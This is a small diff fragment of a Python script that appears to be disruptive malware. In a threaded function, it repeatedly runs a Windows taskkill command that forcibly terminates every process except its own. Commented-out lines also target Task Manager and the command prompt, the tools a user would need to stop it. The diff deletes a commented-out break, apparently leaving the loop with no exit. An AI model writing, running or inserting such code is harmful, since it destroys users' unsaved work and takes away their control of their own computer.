@@ -13,7 +13,6 @@ def master():
         #system('taskkill /IM "taskmanager.exe" /F')
         #system('taskkill /IM "cmd.exe" /F')
         system('taskkill /f /t /fi "PID ne '+str(getpid())+'"')
-        #break
     
 
 t = threading.Thread(target=master)
